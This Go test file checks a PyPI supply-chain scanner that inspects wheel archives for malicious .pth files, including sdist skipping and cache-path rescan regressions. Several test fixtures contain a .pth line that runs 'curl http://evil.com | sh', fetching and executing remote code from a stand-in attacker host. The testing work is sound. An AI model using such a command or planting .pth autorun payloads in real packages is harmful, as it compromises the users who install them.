package builtin_test

import (
	"archive/zip"
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner/builtin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// createTestWhl creates a .whl (zip) archive at a temp path with the given file contents.
func createTestWhl(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	whlPath := filepath.Join(dir, "test-1.0.0-py3-none-any.whl")
	f, err := os.Create(whlPath)
	require.NoError(t, err)
	w := zip.NewWriter(f)
	for name, content := range files {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	require.NoError(t, f.Close())
	return whlPath
}

func TestPTHInspector_MaliciousPTH_ReturnsMalicious(t *testing.T) {
	whlPath := createTestWhl(t, map[string]string{
		"evil.pth": "import os; os.system('curl http://evil.com | sh')",
	})

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "test-pkg-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: whlPath,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
	assert.InDelta(t, 0.95, result.Confidence, 0.001)
	assert.NotEmpty(t, result.Findings)
}

func TestPTHInspector_CleanPackage_ReturnsClean(t *testing.T) {
	whlPath := createTestWhl(t, map[string]string{
		"setup.py":           "from setuptools import setup\nsetup(name='test')\n",
		"mypackage/__init__.py": "# empty\n",
	})

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "test-pkg-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: whlPath,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
}

func TestPTHInspector_SafePTH_ReturnsClean(t *testing.T) {
	whlPath := createTestWhl(t, map[string]string{
		"safe.pth": "./src",
	})

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "test-pkg-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: whlPath,
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
}

func TestPTHInspector_NonWheelSdist_SkipsCleanly(t *testing.T) {
	// pth-inspector only applies to wheels. An sdist (.tar.gz) is not a zip
	// archive, so the old code's zip.OpenReader failed and surfaced ScanResult
	// .Error — which, once the engine promotes result.Error to a scanner failure,
	// fails closed on every normal sdist when pth-inspector is marked `required`.
	// The scanner must instead skip non-wheel artifacts cleanly (no error).
	dir := t.TempDir()
	sdistPath := filepath.Join(dir, "test-1.0.0.tar.gz")
	require.NoError(t, os.WriteFile(sdistPath, []byte("not a zip archive"), 0o600))

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "test-pkg-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: sdistPath,
		Filename:  "test-1.0.0.tar.gz",
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
	assert.NoError(t, result.Error, "non-wheel artifact must skip cleanly, not error")
}

func TestPTHInspector_MaliciousPTHInWheel_StillScannedViaFilename(t *testing.T) {
	// A genuine wheel (.whl filename) must still be opened and scanned even with
	// the non-wheel skip guard in place.
	whlPath := createTestWhl(t, map[string]string{
		"evil.pth": "import os; os.system('curl http://evil.com | sh')",
	})

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "test-pkg-1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: whlPath,
		Filename:  "test-1.0.0-py3-none-any.whl",
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
	assert.NotEmpty(t, result.Findings)
}

func TestPTHInspector_MaliciousWheel_CachePathNoFilename_StillScannedViaID(t *testing.T) {
	// Regression: the rescan scheduler builds scanner.Artifact without Filename
	// (internal/scheduler/rescan.go), and cache backends hand back extensionless
	// temp paths (e.g. shieldoo-s3-cache-*, *.tmp). With only the LocalPath
	// fallback, the ".whl" suffix check missed and a malicious cached wheel was
	// reported CLEAN on manual rescan. The scanner must recover the wheel name
	// from the PyPI artifact ID's 4th colon segment
	// (ecosystem:name:version:filename), which is reliable where LocalPath is not.
	dir := t.TempDir()
	cachePath := filepath.Join(dir, "shieldoo-s3-cache-abc123") // no extension
	f, err := os.Create(cachePath)
	require.NoError(t, err)
	w := zip.NewWriter(f)
	fw, err := w.Create("evil.pth")
	require.NoError(t, err)
	_, err = fw.Write([]byte("import os; os.system('curl http://evil.com | sh')"))
	require.NoError(t, err)
	require.NoError(t, w.Close())
	require.NoError(t, f.Close())

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "pypi:test-pkg:1.0.0:test_pkg-1.0.0-py3-none-any.whl",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: cachePath, // extensionless cache path
		// Filename intentionally empty — mirrors rescan.go.
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
	assert.NotEmpty(t, result.Findings)
}

func TestPTHInspector_SdistViaID_CachePathNoFilename_SkipsCleanly(t *testing.T) {
	// Inverse of the wheel case: a cached sdist on rescan (no Filename,
	// extensionless cache path) must still be recognised as a non-wheel from the
	// artifact ID and skipped cleanly, never force-opened as a zip.
	dir := t.TempDir()
	cachePath := filepath.Join(dir, "shieldoo-s3-cache-def456")
	require.NoError(t, os.WriteFile(cachePath, []byte("not a zip archive"), 0o600))

	s := builtin.NewPTHInspector()
	result, err := s.Scan(context.Background(), scanner.Artifact{
		ID:        "pypi:test-pkg:1.0.0:test-pkg-1.0.0.tar.gz",
		Ecosystem: scanner.EcosystemPyPI,
		Name:      "test-pkg",
		Version:   "1.0.0",
		LocalPath: cachePath,
		// Filename intentionally empty.
	})

	require.NoError(t, err)
	assert.Equal(t, scanner.VerdictClean, result.Verdict)
	assert.Empty(t, result.Findings)
	assert.NoError(t, result.Error)
}

func TestPTHInspector_SupportedEcosystems_OnlyPyPI(t *testing.T) {
	s := builtin.NewPTHInspector()
	ecosystems := s.SupportedEcosystems()
	require.Len(t, ecosystems, 1)
	assert.Equal(t, scanner.EcosystemPyPI, ecosystems[0])
}
